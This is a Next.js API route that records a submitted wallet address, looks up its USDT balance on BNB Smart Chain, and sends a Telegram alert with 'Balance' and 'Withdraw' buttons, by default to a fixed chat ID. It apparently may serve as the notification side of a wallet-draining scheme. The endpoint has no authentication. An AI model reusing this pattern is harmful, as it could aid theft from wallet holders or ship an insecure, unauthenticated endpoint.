import { NextResponse } from 'next/server';
import { TELEGRAM_BOT_TOKEN, USDT_CONTRACT_ADDRESS, USDT_ABI, CHAT_ID } from '../../../components/constent';
import { connectedWallets } from '../telegram-webhook/route';
import { ethers } from 'ethers';

export async function GET(req: Request) {
  const { searchParams } = new URL(req.url);
  const chatId = searchParams.get('chatId') || CHAT_ID;
  const wallet = searchParams.get('wallet');

  if (!wallet) {
    return NextResponse.json({
      success: false,
      error: 'Please provide wallet address'
    }, { status: 400 });
  }

  try {
    // Store wallet
    connectedWallets.set(parseInt(chatId), wallet);

    // Get balance
    let balanceText = 'Check Balance';
    try {
      const provider = new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com');
      const tokenContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
      const balance = await tokenContract.balanceOf(wallet);
      const balanceFormatted = ethers.formatUnits(balance, 18);
      balanceText = `Balance: ${balanceFormatted} USDT`;
    } catch (err) {
      console.error('Error fetching balance:', err);
    }

    // Send message with buttons
    const responseText = `✅ Wallet detected: <code>${wallet}</code>\n\nYou can now withdraw USDT:`;
    const replyMarkup = {
      inline_keyboard: [
        [{ text: `💰 ${balanceText}`, callback_data: 'balance' }],
        [{ text: '💸 Withdraw', callback_data: 'withdraw' }],
      ]
    };

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: responseText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: replyMarkup,
      }),
    });

    const data = await response.json();

    if (data.ok) {
      return NextResponse.json({
        success: true,
        message: 'Button message sent',
        messageId: data.result.message_id
      });
    } else {
      return NextResponse.json({
        success: false,
        error: data.description
      }, { status: 400 });
    }
  } catch (err) {
    return NextResponse.json({
      success: false,
      error: (err as Error).message
    }, { status: 500 });
  }
}
